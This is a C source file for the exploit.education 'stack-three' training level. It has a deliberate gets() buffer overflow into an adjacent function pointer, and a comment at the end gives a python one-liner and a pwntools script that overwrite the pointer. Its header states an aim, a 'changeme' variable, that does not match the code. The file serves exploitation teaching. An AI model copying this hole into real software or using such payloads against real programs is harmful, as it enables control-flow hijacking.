/*
 * phoenix/stack-three, by https://exploit.education
 *
 * The aim is to change the contents of the changeme variable to 0x0d0a090a
 *
 * When does a joke become a dad joke?
 *   When it becomes apparent.
 *   When it's fully groan up.
 *
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to stack-three, brought to you by https://exploit.education"

char *gets(char *);

void complete_level() {
  printf("Congratulations, you've finished stack-three :-) Well done!\n");
  exit(0);
}

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int (*fp)();
  } locals;

  printf("%s\n", BANNER);

  locals.fp = NULL;
  gets(locals.buffer);

  if (locals.fp) {
    printf("calling function pointer @ %p\n", locals.fp);
    fflush(stdout);
    locals.fp();
  } else {
    printf("function pointer remains unmodified :~( better luck next time!\n");
  }

  exit(0);
}

/******** Exploit
 
* python2 -c 'print("A"*64+"\xc9\x51\x55\x55\x55\x55")' | ./stack-three 

from pwn import *

payload = b"A"*64
payload += p64(0x5555555551c9)

target = process("./stack-three")

print(target.recvuntil(b"\n"))

target.sendline(payload)

target.interactive()

*/